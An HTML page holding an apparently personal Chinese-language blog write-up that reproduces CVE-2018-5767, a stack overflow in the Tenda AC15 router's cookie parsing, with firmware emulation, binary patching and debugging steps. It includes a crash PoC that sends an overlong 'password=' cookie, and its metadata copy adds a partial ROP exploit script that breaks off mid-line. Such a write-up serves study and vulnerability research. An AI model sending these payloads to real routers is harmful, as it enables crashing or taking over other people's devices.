<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>test</title>
<meta name="keywords" content="">
<meta name="description" content="CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞复现 复现目的： 熟悉设备漏洞的环境模拟（qemu-user模式的利用） 了解基本的arm指令和函数调用方式，并且构建ROP利用链 漏洞基本信息： 该漏洞是18年出现的漏洞，由于没有对用户输入字符长度进行限制，导致包中的cookie字段过长时会产生栈溢出漏洞
环境搭建 环境搭建前言 由于是arm架构的漏洞，所以我们需要利用qemu进行环境仿真。（如果有富哥们也可以直接买真机，顺便V我50）
这里需要注意，ubuntu如果直接使用apt安装qemu，会因为qemu版本太低导致仿真环境出现问题，所以我选择的是自己编译高版本的qemu （也就是5.2.0，也没有多高）
环境搭建正文 首先，我们下载TENDA-AC15的固件 ，固件的版本为：15.03.1.16_multi
随后使用binwalk提取固件
binwalk -Me1 US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin#注意这里的‘1’是数字1 进入提取出来的文件夹后，我们可以看到一个文件名字类似于linux系统root目录的文件：
![image-20221230140854139](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230140854139.png)
通过检查一下busybox，目的是检查该固件需要的位数和架构：
![image-20221230140953839](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230140953839.png)
arm架构，32位，小端。
所以我们需要使用qemu-arm-static来拟真环境
sudo ./qemu-arm-static -L . ./bin/httpd 这里的 -L .是qemu-arm-static自带的一个chroot指令，可以理解为 chroot ./
![image-20221230141033538](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230141033538.png)
执行命令后，我们看到程序在 Welcome to ...处不动了。
为了搞清具体什么问题，我们可以在ida中搜索字符串，找到这个位置：
![image-20221230141350591](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230141350591.png)
通过汇编，我们可以看到大概的流程，显示输出 WeLoveLinux， 随后检查我们的网络环境，如果没有检查通过，则会在这段代码中一直循环。
这里我们可以通过两个方法解决这个问题：
给qemu设置一个虚拟网络 修改二进制文件直接跳过这个检查 这里我选择给ubuntu设置一个桥，然后桥接到qemu：
sudo apt install uml-utilities bridge-utilssudo brctl addbr br0sudo brctl addif br0 ens33sudo ifconfig br0 upsudo dhclient br0 !">
<meta name="author" content="">
<link rel="canonical" href="http://lexshoukaku.github.io/vuln/cve-2018-5767-tenda-ac15%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="http://lexshoukaku.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://lexshoukaku.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://lexshoukaku.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://lexshoukaku.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="http://lexshoukaku.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="" />
<meta property="og:description" content="CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞复现 复现目的： 熟悉设备漏洞的环境模拟（qemu-user模式的利用） 了解基本的arm指令和函数调用方式，并且构建ROP利用链 漏洞基本信息： 该漏洞是18年出现的漏洞，由于没有对用户输入字符长度进行限制，导致包中的cookie字段过长时会产生栈溢出漏洞
环境搭建 环境搭建前言 由于是arm架构的漏洞，所以我们需要利用qemu进行环境仿真。（如果有富哥们也可以直接买真机，顺便V我50）
这里需要注意，ubuntu如果直接使用apt安装qemu，会因为qemu版本太低导致仿真环境出现问题，所以我选择的是自己编译高版本的qemu （也就是5.2.0，也没有多高）
环境搭建正文 首先，我们下载TENDA-AC15的固件 ，固件的版本为：15.03.1.16_multi
随后使用binwalk提取固件
binwalk -Me1 US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin#注意这里的‘1’是数字1 进入提取出来的文件夹后，我们可以看到一个文件名字类似于linux系统root目录的文件：
![image-20221230140854139](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230140854139.png)
通过检查一下busybox，目的是检查该固件需要的位数和架构：
![image-20221230140953839](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230140953839.png)
arm架构，32位，小端。
所以我们需要使用qemu-arm-static来拟真环境
sudo ./qemu-arm-static -L . ./bin/httpd 这里的 -L .是qemu-arm-static自带的一个chroot指令，可以理解为 chroot ./
![image-20221230141033538](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230141033538.png)
执行命令后，我们看到程序在 Welcome to ...处不动了。
为了搞清具体什么问题，我们可以在ida中搜索字符串，找到这个位置：
![image-20221230141350591](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230141350591.png)
通过汇编，我们可以看到大概的流程，显示输出 WeLoveLinux， 随后检查我们的网络环境，如果没有检查通过，则会在这段代码中一直循环。
这里我们可以通过两个方法解决这个问题：
给qemu设置一个虚拟网络 修改二进制文件直接跳过这个检查 这里我选择给ubuntu设置一个桥，然后桥接到qemu：
sudo apt install uml-utilities bridge-utilssudo brctl addbr br0sudo brctl addif br0 ens33sudo ifconfig br0 upsudo dhclient br0 !" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://lexshoukaku.github.io/vuln/cve-2018-5767-tenda-ac15%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/" /><meta property="article:section" content="vuln" />



<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content=""/>
<meta name="twitter:description" content="CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞复现 复现目的： 熟悉设备漏洞的环境模拟（qemu-user模式的利用） 了解基本的arm指令和函数调用方式，并且构建ROP利用链 漏洞基本信息： 该漏洞是18年出现的漏洞，由于没有对用户输入字符长度进行限制，导致包中的cookie字段过长时会产生栈溢出漏洞
环境搭建 环境搭建前言 由于是arm架构的漏洞，所以我们需要利用qemu进行环境仿真。（如果有富哥们也可以直接买真机，顺便V我50）
这里需要注意，ubuntu如果直接使用apt安装qemu，会因为qemu版本太低导致仿真环境出现问题，所以我选择的是自己编译高版本的qemu （也就是5.2.0，也没有多高）
环境搭建正文 首先，我们下载TENDA-AC15的固件 ，固件的版本为：15.03.1.16_multi
随后使用binwalk提取固件
binwalk -Me1 US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin#注意这里的‘1’是数字1 进入提取出来的文件夹后，我们可以看到一个文件名字类似于linux系统root目录的文件：
![image-20221230140854139](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230140854139.png)
通过检查一下busybox，目的是检查该固件需要的位数和架构：
![image-20221230140953839](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230140953839.png)
arm架构，32位，小端。
所以我们需要使用qemu-arm-static来拟真环境
sudo ./qemu-arm-static -L . ./bin/httpd 这里的 -L .是qemu-arm-static自带的一个chroot指令，可以理解为 chroot ./
![image-20221230141033538](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230141033538.png)
执行命令后，我们看到程序在 Welcome to ...处不动了。
为了搞清具体什么问题，我们可以在ida中搜索字符串，找到这个位置：
![image-20221230141350591](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230141350591.png)
通过汇编，我们可以看到大概的流程，显示输出 WeLoveLinux， 随后检查我们的网络环境，如果没有检查通过，则会在这段代码中一直循环。
这里我们可以通过两个方法解决这个问题：
给qemu设置一个虚拟网络 修改二进制文件直接跳过这个检查 这里我选择给ubuntu设置一个桥，然后桥接到qemu：
sudo apt install uml-utilities bridge-utilssudo brctl addbr br0sudo brctl addif br0 ens33sudo ifconfig br0 upsudo dhclient br0 !"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Vulns",
      "item": "http://lexshoukaku.github.io/vuln/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "",
      "item": "http://lexshoukaku.github.io/vuln/cve-2018-5767-tenda-ac15%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "",
  "name": "",
  "description": "CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞复现 复现目的： 熟悉设备漏洞的环境模拟（qemu-user模式的利用） 了解基本的arm指令和函数调用方式，并且构建ROP利用链 漏洞基本信息： 该漏洞是18年出现的漏洞，由于没有对用户输入字符长度进行限制，导致包中的cookie字段过长时会产生栈溢出漏洞\n环境搭建 环境搭建前言 由于是arm架构的漏洞，所以我们需要利用qemu进行环境仿真。（如果有富哥们也可以直接买真机，顺便V我50）\n这里需要注意，ubuntu如果直接使用apt安装qemu，会因为qemu版本太低导致仿真环境出现问题，所以我选择的是自己编译高版本的qemu （也就是5.2.0，也没有多高）\n环境搭建正文 首先，我们下载TENDA-AC15的固件 ，固件的版本为：15.03.1.16_multi\n随后使用binwalk提取固件\nbinwalk -Me1 US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin\r#注意这里的‘1’是数字1 进入提取出来的文件夹后，我们可以看到一个文件名字类似于linux系统root目录的文件：\n![image-20221230140854139](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230140854139.png)\n通过检查一下busybox，目的是检查该固件需要的位数和架构：\n![image-20221230140953839](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230140953839.png)\narm架构，32位，小端。\n所以我们需要使用qemu-arm-static来拟真环境\nsudo ./qemu-arm-static -L . ./bin/httpd 这里的 -L .是qemu-arm-static自带的一个chroot指令，可以理解为 chroot ./\n![image-20221230141033538](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230141033538.png)\n执行命令后，我们看到程序在 Welcome to ...处不动了。\n为了搞清具体什么问题，我们可以在ida中搜索字符串，找到这个位置：\n![image-20221230141350591](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230141350591.png)\n通过汇编，我们可以看到大概的流程，显示输出 WeLoveLinux， 随后检查我们的网络环境，如果没有检查通过，则会在这段代码中一直循环。\n这里我们可以通过两个方法解决这个问题：\n给qemu设置一个虚拟网络 修改二进制文件直接跳过这个检查 这里我选择给ubuntu设置一个桥，然后桥接到qemu：\nsudo apt install uml-utilities bridge-utils\rsudo brctl addbr br0\rsudo brctl addif br0 ens33\rsudo ifconfig br0 up\rsudo dhclient br0 !",
  "keywords": [
    
  ],
  "articleBody": "CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞复现 复现目的： 熟悉设备漏洞的环境模拟（qemu-user模式的利用） 了解基本的arm指令和函数调用方式，并且构建ROP利用链 漏洞基本信息： 该漏洞是18年出现的漏洞，由于没有对用户输入字符长度进行限制，导致包中的cookie字段过长时会产生栈溢出漏洞\n环境搭建 环境搭建前言 由于是arm架构的漏洞，所以我们需要利用qemu进行环境仿真。（如果有富哥们也可以直接买真机，顺便V我50）\n这里需要注意，ubuntu如果直接使用apt安装qemu，会因为qemu版本太低导致仿真环境出现问题，所以我选择的是自己编译高版本的qemu （也就是5.2.0，也没有多高）\n环境搭建正文 首先，我们下载TENDA-AC15的固件 ，固件的版本为：15.03.1.16_multi\n随后使用binwalk提取固件\nbinwalk -Me1 US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin\r#注意这里的‘1’是数字1 进入提取出来的文件夹后，我们可以看到一个文件名字类似于linux系统root目录的文件：\n![image-20221230140854139](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230140854139.png)\n通过检查一下busybox，目的是检查该固件需要的位数和架构：\n![image-20221230140953839](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230140953839.png)\narm架构，32位，小端。\n所以我们需要使用qemu-arm-static来拟真环境\nsudo ./qemu-arm-static -L . ./bin/httpd 这里的 -L .是qemu-arm-static自带的一个chroot指令，可以理解为 chroot ./\n![image-20221230141033538](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230141033538.png)\n执行命令后，我们看到程序在 Welcome to ...处不动了。\n为了搞清具体什么问题，我们可以在ida中搜索字符串，找到这个位置：\n![image-20221230141350591](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230141350591.png)\n通过汇编，我们可以看到大概的流程，显示输出 WeLoveLinux， 随后检查我们的网络环境，如果没有检查通过，则会在这段代码中一直循环。\n这里我们可以通过两个方法解决这个问题：\n给qemu设置一个虚拟网络 修改二进制文件直接跳过这个检查 这里我选择给ubuntu设置一个桥，然后桥接到qemu：\nsudo apt install uml-utilities bridge-utils\rsudo brctl addbr br0\rsudo brctl addif br0 ens33\rsudo ifconfig br0 up\rsudo dhclient br0 ![image-20221230142043923](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230142043923.png)\n通过 ifconfig可以查看到桥已经创建成功\n随后我们再次运行httpd就可以看到刚刚问题被解决了，但是又遇到了另外一个问题：\n![image-20221230142505492](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230142505492.png)\n其实这个报错的地点就在刚刚那个问题的下面：\n![image-20221230143027529](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230143027529.png)\n通过分析汇编，我们可以看到，解决掉刚刚的问题后，程序会跳转到下面进入一个叫做 ConnectCfm 的函数，然后检查返回值，如果检查通过则跳转，没通过就报错\n很明显我们这里没有检查通过，所以我们这里直接选择修改二进制文件：\n![image-20221230143747533](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230143747533.png)\n这里的逻辑大致为：\n函数结束，将返回值放入r0 将r0让如r3 比较r3是否为0 如果不是0则跳转，如果是则继续运行报错 所以我们这里直接选择将上面的 mov r3,r0 改为 mov r3,#1，这样就能保证r3不为0了。\n这里我选择的是ida的 patch功能+在线arm翻译。当然也有很多patch功能的ida插件，大家可以自行选用\n![image-20221230144506777](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230144506777.png)\n![image-20221230145009653](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230145009653.png)\n改完之后记得点 Apply patches to input file...\n然后覆盖之前的httpd二进制，就可以顺利的启动了：\n![image-20221230145532024](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230145532024.png)\n访问 http://192.168.52.128/goform/getProduct\n![image-20221230145834407](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230145834407.png)\n说明环境已经模拟成功了\n漏洞分析 首先我们找到网上的poc：\n#python3\rimport requests\rurl = \"http://192.168.52.128/goform/xxx\"\rcookie = {\"Cookie\":\"password=\"+\"A\"*1000}\rrequests.get(url=url, cookies=cookie) 分析poc，我们可以知道漏洞大概出现在对cookie字段进行分析的代码中\n我们首先在gdb中调试一下这个poc：\n使用以下命令重新打开httpd：\nsudo ./qemu-arm-static -L . -g 1234 ./bin/httpd\r# 1234就是qemu监听的调试端口，只需将ida或者gdb等连接到该端口即可进行调试 然后在另一边使用gdb-multiarch打开httpd，链接1234端口\nsudo gdb-multiarch ./bin/httpd\rtarget remote :1234 就可以进行调试了\n这里我们首先让程序跑起来，然后发送poc\n查看gdb时，发现gdb已经 Segmentation fault了\n这时我们查看一下bt\n![image-20221230153421902](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230153421902.png)\n发现程序进入了strstr()，随后Segmentation fault\n根据poc和bt的信息，我们可以猜测溢出点是在strstr()函数读取cookie或者password=时，所以我们通过ida进行字符串查找符合条件的地点：\n首先我们查找cookie，虽然能找到cookie字符串，但是在字符串出现的上下文中，没有找到strstr()函数的调用。\n然后我们查找password=，然后查看交叉调用，发现一个符合条件的地址：\n![image-20221230161245354](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230161245354.png)\n![image-20221230161305168](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230161305168.png)\n通过伪代码，我们可以看到，这里是把这里是在寻找password=和之后的内容，然后把 =和 ;之中的内容读取到 v31中。\n溢出点就在这里，v31的大小只有0x1c0，所以我们读取1000个字符，会造成溢出。\n漏洞利用 因为存在/x00截断，所以构造rop时，不能使用三个字节的地址。除非二进制文件本身足够大，否则只能去libc里找地址，如果同时libc开启了pie，那这个漏洞基本就没了\n因为我们要控制返回地址从而控制程序流，而现在的问题就是/x00截断。因为/x00截断，所以我们必须去libc中寻找四个字节的ROP地址。但是libc中又开启了PIE，但路由所提供的服务不能泄露libc的地址，因为这个基地址我们只能到路由设备上进行查看：\n查看的方法有两种：\n1.cat /proc/[pid]/maps\n2.在gdb中查看puts函数的地址，再减去puts函数在libc中的偏移\n我选择的是方法二，因为方法一查出来的libc基地址不准确，个人猜测是qemu模拟环境的问题\n![image-20230103092612044](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20230103092612044.png)\n然后puts在libc中的偏移量为 0x35cd4\n故基地址为 0x3fe1bcd4-0x35cd4=0x3fde6000\n随后我们寻找ROP：\n![image-20230103093949704](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20230103093949704.png)\n![image-20230103094046647](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20230103094046647.png)\n通过这两个指令我们可以看到：\n首先把puts放入r3，把下一条指令地址放入pc，随后将栈顶（参数）放入r0，然后跳转到函数\n故最后的exp：\nimport struct\rimport requests\rstring = \"shoukaku\"\rputs = 0x3fe1bcd4\rlibc_base = puts-0x35cd4\rpop_r3_pc = struct.pack('",
  "wordCount" : "245",
  "inLanguage": "en",
  "datePublished": "0001-01-01T00:00:00Z",
  "dateModified": "0001-01-01T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://lexshoukaku.github.io/vuln/cve-2018-5767-tenda-ac15%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "test",
    "logo": {
      "@type": "ImageObject",
      "url": "http://lexshoukaku.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://lexshoukaku.github.io" accesskey="h" title="test (Alt + H)">test</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title">
      
    </h1>
    <div class="post-meta">

</div>
  </header> 
  <div class="post-content"><h2 id="cve-2018-5767-tenda-ac15路由器栈溢出漏洞复现">CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞复现<a hidden class="anchor" aria-hidden="true" href="#cve-2018-5767-tenda-ac15路由器栈溢出漏洞复现">#</a></h2>
<h3 id="复现目的">复现目的：<a hidden class="anchor" aria-hidden="true" href="#复现目的">#</a></h3>
<ul>
<li>熟悉设备漏洞的环境模拟（qemu-user模式的利用）</li>
<li>了解基本的arm指令和函数调用方式，并且构建ROP利用链</li>
</ul>
<h3 id="漏洞基本信息">漏洞基本信息：<a hidden class="anchor" aria-hidden="true" href="#漏洞基本信息">#</a></h3>
<p>该漏洞是18年出现的漏洞，由于没有对用户输入字符长度进行限制，导致包中的cookie字段过长时会产生栈溢出漏洞</p>
<h3 id="环境搭建">环境搭建<a hidden class="anchor" aria-hidden="true" href="#环境搭建">#</a></h3>
<h5 id="环境搭建前言">环境搭建前言<a hidden class="anchor" aria-hidden="true" href="#环境搭建前言">#</a></h5>
<p>由于是arm架构的漏洞，所以我们需要利用qemu进行环境仿真。<del>（如果有富哥们也可以直接买真机，顺便V我50）</del></p>
<p>这里需要注意，ubuntu如果直接使用apt安装qemu，会因为qemu版本太低导致仿真环境出现问题，所以我选择的是自己编译高版本的qemu <del>（也就是5.2.0，也没有多高）</del></p>
<h5 id="环境搭建正文">环境搭建正文<a hidden class="anchor" aria-hidden="true" href="#环境搭建正文">#</a></h5>
<p>首先，我们下载TENDA-AC15的<a href="https://drivers.softpedia.com/get/Router-Switch-Access-Point/Tenda/Tenda-AC15-Router-Firmware-1503116.shtml">固件</a> ，固件的版本为：15.03.1.16_multi</p>
<p>随后使用binwalk提取固件</p>
<pre tabindex="0"><code>binwalk -Me1 US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin
#注意这里的‘1’是数字1
</code></pre><p>进入提取出来的文件夹后，我们可以看到一个文件名字类似于linux系统root目录的文件：</p>
<p>![image-20221230140854139](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230140854139.png)</p>
<p>通过检查一下busybox，目的是检查该固件需要的位数和架构：</p>
<p>![image-20221230140953839](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230140953839.png)</p>
<p>arm架构，32位，小端。</p>
<p>所以我们需要使用qemu-arm-static来拟真环境</p>
<pre tabindex="0"><code>sudo ./qemu-arm-static -L . ./bin/httpd
</code></pre><blockquote>
<p>这里的 <code>-L .</code>是qemu-arm-static自带的一个chroot指令，可以理解为 <code>chroot ./</code></p>
</blockquote>
<p>![image-20221230141033538](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230141033538.png)</p>
<p>执行命令后，我们看到程序在 <code>Welcome to ...</code>处不动了。</p>
<p>为了搞清具体什么问题，我们可以在ida中搜索字符串，找到这个位置：</p>
<p>![image-20221230141350591](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230141350591.png)</p>
<p>通过汇编，我们可以看到大概的流程，显示输出 <code>WeLoveLinux</code>， 随后检查我们的网络环境，如果没有检查通过，则会在这段代码中一直循环。</p>
<p>这里我们可以通过两个方法解决这个问题：</p>
<ol>
<li>给qemu设置一个虚拟网络</li>
<li>修改二进制文件直接跳过这个检查</li>
</ol>
<p>这里我选择给ubuntu设置一个桥，然后桥接到qemu：</p>
<pre tabindex="0"><code>sudo apt install uml-utilities bridge-utils
sudo brctl addbr br0
sudo brctl addif br0 ens33
sudo ifconfig br0 up
sudo dhclient br0
</code></pre><p>![image-20221230142043923](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230142043923.png)</p>
<p>通过 <code>ifconfig</code>可以查看到桥已经创建成功</p>
<p>随后我们再次运行<code>httpd</code>就可以看到刚刚问题被解决了，但是又遇到了另外一个问题：</p>
<p>![image-20221230142505492](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230142505492.png)</p>
<p>其实这个报错的地点就在刚刚那个问题的下面：</p>
<p>![image-20221230143027529](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230143027529.png)</p>
<p>通过分析汇编，我们可以看到，解决掉刚刚的问题后，程序会跳转到下面进入一个叫做 <code>ConnectCfm</code> 的函数，然后检查返回值，如果检查通过则跳转，没通过就报错</p>
<p>很明显我们这里没有检查通过，所以我们这里直接选择修改二进制文件：</p>
<p>![image-20221230143747533](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230143747533.png)</p>
<p>这里的逻辑大致为：</p>
<ul>
<li>函数结束，将返回值放入r0</li>
<li>将r0让如r3</li>
<li>比较r3是否为0</li>
<li>如果不是0则跳转，如果是则继续运行报错</li>
</ul>
<p>所以我们这里直接选择将上面的 <code>mov r3,r0</code> 改为 <code>mov r3,#1</code>，这样就能保证r3不为0了。</p>
<p>这里我选择的是ida的 patch功能+<a href="https://armconverter.com">在线arm翻译</a>。当然也有很多patch功能的ida插件，大家可以自行选用</p>
<p>![image-20221230144506777](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230144506777.png)</p>
<p>![image-20221230145009653](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230145009653.png)</p>
<p>改完之后记得点 <code>Apply patches to input file...</code></p>
<p>然后覆盖之前的httpd二进制，就可以顺利的启动了：</p>
<p>![image-20221230145532024](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230145532024.png)</p>
<p>访问 <code>http://192.168.52.128/goform/getProduct</code></p>
<p>![image-20221230145834407](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230145834407.png)</p>
<p>说明环境已经模拟成功了</p>
<h3 id="heading"><a hidden class="anchor" aria-hidden="true" href="#heading">#</a></h3>
<h3 id="漏洞分析">漏洞分析<a hidden class="anchor" aria-hidden="true" href="#漏洞分析">#</a></h3>
<p>首先我们找到网上的poc：</p>
<pre tabindex="0"><code>#python3

import requests
url = &#34;http://192.168.52.128/goform/xxx&#34;
cookie = {&#34;Cookie&#34;:&#34;password=&#34;+&#34;A&#34;*1000}
requests.get(url=url, cookies=cookie)
</code></pre><p>分析poc，我们可以知道漏洞大概出现在对cookie字段进行分析的代码中</p>
<p>我们首先在gdb中调试一下这个poc：</p>
<p>使用以下命令重新打开httpd：</p>
<pre tabindex="0"><code>sudo ./qemu-arm-static -L . -g 1234 ./bin/httpd
# 1234就是qemu监听的调试端口，只需将ida或者gdb等连接到该端口即可进行调试
</code></pre><p>然后在另一边使用gdb-multiarch打开httpd，链接1234端口</p>
<pre tabindex="0"><code>sudo gdb-multiarch ./bin/httpd
target remote :1234
</code></pre><p>就可以进行调试了</p>
<p>这里我们首先让程序跑起来，然后发送poc</p>
<p>查看gdb时，发现gdb已经 <code>Segmentation fault</code>了</p>
<p>这时我们查看一下bt</p>
<p>![image-20221230153421902](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230153421902.png)</p>
<p>发现程序进入了<code>strstr()</code>，随后<code>Segmentation fault</code></p>
<p>根据poc和bt的信息，我们可以猜测溢出点是在<code>strstr()</code>函数读取<code>cookie</code>或者<code>password=</code>时，所以我们通过ida进行字符串查找符合条件的地点：</p>
<p>首先我们查找<code>cookie</code>，虽然能找到<code>cookie</code>字符串，但是在字符串出现的上下文中，没有找到<code>strstr()</code>函数的调用。</p>
<p>然后我们查找<code>password=</code>，然后查看交叉调用，发现一个符合条件的地址：</p>
<p>![image-20221230161245354](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230161245354.png)</p>
<p>![image-20221230161305168](CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞.assets/image-20221230161305168.png)</p>
